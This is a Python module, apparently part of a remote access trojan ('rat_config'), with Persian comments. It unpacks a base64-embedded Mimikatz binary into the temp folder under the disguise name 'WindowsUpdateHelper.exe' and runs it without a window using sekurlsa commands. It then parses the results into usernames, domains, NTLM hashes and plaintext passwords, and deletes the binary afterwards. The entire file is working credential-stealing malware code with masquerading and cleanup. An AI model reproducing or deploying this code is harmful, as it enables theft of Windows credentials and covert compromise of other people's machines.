# system/credential_extractor.py
import os
import subprocess
import tempfile
import logging
import base64
import re
import sys
from typing import Dict, List, Optional, Any
from datetime import datetime
import time
from rat_config import Config

class CredentialExtractor:
    """استخراج credential های ویندوز با استفاده از Mimikatz"""
    
    def __init__(self):
        self.logger = logging.getLogger("CredentialExtractor")
        self.mimikatz_path = self._load_mimikatz_binary()
        
    def _find_mimikatz_file(self) -> Optional[str]:
        """پیدا کردن فایل mimikatz.b64 در مسیرهای مختلف"""
        base_path = self._get_base_path()
        
        # لیست تمام مسیرهای ممکن
        possible_paths = [
            # در root bundle
            os.path.join(base_path, "mimikatz.b64"),
            # در پوشه binaries در bundle
            os.path.join(base_path, "binaries", "mimikatz.b64"),
            # در پوشه فعلی (برای حالت توسعه)
            os.path.join(os.path.dirname(__file__), "..", "binaries", "mimikatz.b64"),
            os.path.join(os.getcwd(), "binaries", "mimikatz.b64"),
            "binaries/mimikatz.b64",
        ]
        
        for path in possible_paths:
            normalized_path = os.path.normpath(path)
            self.logger.info(f"Checking path: {normalized_path}")
            if os.path.exists(normalized_path):
                self.logger.info(f"✅ Found mimikatz.b64 at: {normalized_path}")
                return normalized_path
        
        self.logger.error("❌ mimikatz.b64 not found in any location")
        
        # لیست فایل‌های موجود برای دیباگ
        try:
            self.logger.info("📁 Listing files in bundle directory:")
            if os.path.exists(base_path):
                files = os.listdir(base_path)
                for file in files:
                    file_path = os.path.join(base_path, file)
                    if os.path.isdir(file_path):
                        self.logger.info(f"📂 Directory: {file}")
                        sub_files = os.listdir(file_path)
                        for sub_file in sub_files:
                            self.logger.info(f"   📄 {sub_file}")
                    else:
                        self.logger.info(f"📄 File: {file}")
        except Exception as e:
            self.logger.error(f"Error listing files: {e}")
        
        return None

    def _get_base_path(self):
        """دریافت مسیر پایه برای فایل‌های bundle شده"""
        try:
            if getattr(sys, 'frozen', False):
                return sys._MEIPASS
            else:
                return os.path.dirname(os.path.abspath(__file__))
        except:
            return os.path.dirname(os.path.abspath(__file__))

    def _load_mimikatz_binary(self) -> Optional[str]:
        """لود فایل mimikatz از فایل base64"""
        try:
            b64_path = self._find_mimikatz_file()
            
            if not b64_path:
                return None
            
            # خواندن محتوای فایل
            with open(b64_path, 'r', encoding='utf-8') as f:
                b64_content = f.read().strip()
            
            if not b64_content:
                self.logger.error("mimikatz.b64 file is empty")
                return None
            
            # پاکسازی base64
            clean_b64 = ''.join(b64_content.split())
            
            # ایجاد فایل موقت
            temp_dir = tempfile.gettempdir()
            temp_path = os.path.join(temp_dir, "WindowsUpdateHelper.exe")
            
            # فقط اگر فایل وجود ندارد ایجاد کن
            if not os.path.exists(temp_path):
                try:
                    binary_data = base64.b64decode(clean_b64)
                    
                    # بررسی signature
                    if binary_data[:2] != b'MZ':
                        self.logger.error("Decoded data is not a valid executable")
                        return None
                    
                    with open(temp_path, 'wb') as f:
                        f.write(binary_data)
                    
                    self.logger.info(f"✅ Mimikatz binary prepared: {temp_path} ({len(binary_data)} bytes)")
                    
                except base64.binascii.Error as e:
                    self.logger.error(f"❌ Invalid base64 content: {str(e)}")
                    return None
                except Exception as e:
                    self.logger.error(f"❌ Failed to write binary: {str(e)}")
                    return None
            
            return temp_path
            
        except Exception as e:
            self.logger.error(f"❌ Failed to load mimikatz binary: {str(e)}")
            return None

    # بقیه توابع بدون تغییر...
    def extract_windows_credentials(self) -> Dict[str, Any]:
        """استخراج credential های ویندوز"""
        if not self.mimikatz_path:
            return {
                "status": "error",
                "message": "Mimikatz binary not available",
                "timestamp": datetime.now().isoformat()
            }
        
        try:
            self.logger.info("🔐 Starting Windows credential extraction...")
            
            commands = [
                "privilege::debug",
                "token::elevate", 
                "sekurlsa::logonpasswords",
                "sekurlsa::wdigest",
                "sekurlsa::kerberos", 
                "sekurlsa::tspkg",
                "sekurlsa::credman",
                "exit"
            ]
            
            # ایجاد فایل دستورات
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as cmd_file:
                for command in commands:
                    cmd_file.write(command + '\n')
                commands_file = cmd_file.name
            
            # اجرای Mimikatz
            result = subprocess.run(
                [self.mimikatz_path, f'"{commands_file}"'],
                capture_output=True,
                text=True,
                timeout=120,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # پاکسازی
            try:
                os.unlink(commands_file)
            except:
                pass
            
            # پردازش نتایج
            credentials = self._parse_mimikatz_output(result.stdout)
            
            self.logger.info(f"✅ Credential extraction completed. Found {len(credentials)} entries")
            
            return {
                "status": "success",
                "timestamp": datetime.now().isoformat(),
                "credentials_found": len(credentials),
                "credentials": credentials,
                "execution_info": {
                    "return_code": result.returncode
                }
            }
            
        except subprocess.TimeoutExpired:
            self.logger.error("❌ Mimikatz execution timed out")
            return {
                "status": "error",
                "message": "Execution timeout",
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            self.logger.error(f"❌ Credential extraction failed: {str(e)}")
            return {
                "status": "error",
                "message": f"Extraction failed: {str(e)}",
                "timestamp": datetime.now().isoformat()
            }

    def _parse_mimikatz_output(self, output: str) -> List[Dict[str, Any]]:
        """پارس کردن خروجی Mimikatz"""
        credentials = []
        current_auth = {}
        
        try:
            lines = output.split('\n')
            
            for line in lines:
                line = line.strip()
                
                if "Authentication Id" in line:
                    if current_auth:
                        credentials.append(current_auth)
                    current_auth = {"type": self._detect_auth_type(line)}
                
                elif "User Name" in line and not current_auth.get("username"):
                    current_auth["username"] = self._extract_value(line, "User Name")
                
                elif "Domain" in line and not current_auth.get("domain"):
                    current_auth["domain"] = self._extract_value(line, "Domain")
                
                elif "NTLM" in line and ":" in line and not current_auth.get("ntlm_hash"):
                    current_auth["ntlm_hash"] = self._extract_value(line, "NTLM")
                
                elif "Password" in line and ":" in line and not current_auth.get("password"):
                    current_auth["password"] = self._extract_value(line, "Password")
            
            if current_auth:
                credentials.append(current_auth)
            
        except Exception as e:
            self.logger.error(f"❌ Error parsing output: {str(e)}")
        
        return [cred for cred in credentials if any(cred.get(key) for key in ['username', 'ntlm_hash', 'password'])]

    def _detect_auth_type(self, line: str) -> str:
        """تشخیص نوع authentication"""
        line_lower = line.lower()
        if 'msv' in line_lower:
            return "msv"
        elif 'wdigest' in line_lower:
            return "wdigest"
        elif 'kerberos' in line_lower:
            return "kerberos"
        elif 'tspkg' in line_lower:
            return "tspkg"
        elif 'credman' in line_lower:
            return "credman"
        return "unknown"

    def _extract_value(self, line: str, key: str) -> str:
        """استخراج مقدار از خط"""
        try:
            pattern = rf'{key}\s*:\s*([^\n\r]*)'
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                value = match.group(1).strip()
                return value if value not in ['(null)', 'null', ''] else ""
            return ""
        except:
            return ""

    def cleanup(self):
        """پاکسازی"""
        try:
            if self.mimikatz_path and os.path.exists(self.mimikatz_path):
                os.unlink(self.mimikatz_path)
                self.logger.info("✅ Cleaned up mimikatz temporary file")
        except Exception as e:
            self.logger.warning(f"⚠️ Cleanup failed: {str(e)}")